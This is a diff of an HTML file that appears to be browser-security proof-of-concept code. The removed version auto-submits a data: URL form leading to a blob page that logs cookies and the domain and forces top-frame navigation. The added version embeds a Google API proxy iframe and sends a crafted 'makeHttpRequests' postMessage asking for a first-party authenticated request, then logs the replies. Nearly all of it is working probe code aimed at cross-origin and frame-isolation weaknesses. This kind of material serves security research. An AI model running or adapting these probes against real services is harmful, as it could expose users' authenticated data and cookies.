@@ -1,68 +1,42 @@
 <html>
-<body>
-Hello! I'm the inner frame. I will proceed to try and be irritating.
+<iframe id="iframe" src="https://keep-pa.clients6.google.com/static/proxy.html?usegapi=1&parent=https://sites.google.com/"></iframe>
 
-<form id="f" action="" method="GET" target="_self">
-  <input type="submit" value="Submit"/>
-</form>
+<script type="text/javascript">
+    window.addEventListener("message", function (e) { 
+        // Ensure message comes from expected origin
+        if (e.origin !== "https://keep-pa.clients6.google.com") return;
 
-<script>
-// HTML content to be submitted as a data URL
-var htmlContent = `
-  <html>
-  <head>
-  <script>
-  const sampleHtmlContent = \`
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                <script>
-                window.top.updateCommands(console.log(document.domain));
-                window.parent.updateCommands(console.log(document.cookie));
-                window.updateCommands(window.top.location.href='https://google.com');
-                <\\/script>
-                <script>console.log(window.top);<\\/script>
-                <script>window.parent.location.href = "https://google.com";<\\/script>
-                    <meta charset="UTF-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <title>Sample Blob Page</title>
-                </head>
-                <body>
-                    <h1>Welcome to the Blob Page!</h1>
-                    <p>This page was loaded from a blob.</p>
-                </body>
-                </html>
-            \`;
-  const blob = new Blob([sampleHtmlContent], { type: 'text/html' });
+        console.log("Received message:", e.data);
+    });
 
-            // Create a URL for the Blob object
-            const blobUrl = URL.createObjectURL(blob);
-
-            // Redirect to the Blob URL
-            window.location.href = blobUrl;
-<\/script>
-  </head>
-    <body>
-      <h1>Data URL HTML Content</h1>
-      <p>This content is submitted using a data:text/html URL.</p>
-    </body>
-  </html>
-`;
-
-// Encode the HTML content for use in the data URL
-var encodedContent = encodeURIComponent(htmlContent);
-
-// Create a Data URL with the HTML content
-var dataURL = 'data:text/html;charset=utf-8,' + encodedContent;
-
-// Set the form's action to the Data URL
-var form = document.getElementById('f');
-form.action = dataURL;
-
-// Automatically submit the form
-setTimeout(function() {
-  form.submit();
-}, 100); // Delay to ensure the Data URL is ready
+    document.getElementById("iframe").addEventListener("load", function () {
+        var iframe = document.getElementById("iframe");
+        iframe.contentWindow.postMessage(
+            JSON.stringify({
+                "s": "makeHttpRequests",
+                "f": "..",
+                "c": 1,
+                "a": [[
+                    {
+                        "key": "gapiRequest",
+                        "params": {
+                            "url": "/",
+                            "path": "/",
+                            "httpMethod": "GET",
+                            "headers": {},
+                            "urlParams": {},
+                            "root": "keep-pa.clients6.google.com",
+                            "authType": "1p"
+                        }
+                    }
+                ]],
+                "l": false,
+                "g": true,
+                "t": "",
+                "r": ".."
+            }),
+            "https://keep-pa.clients6.google.com"
+        );
+    });
 </script>
-</body>
 </html>
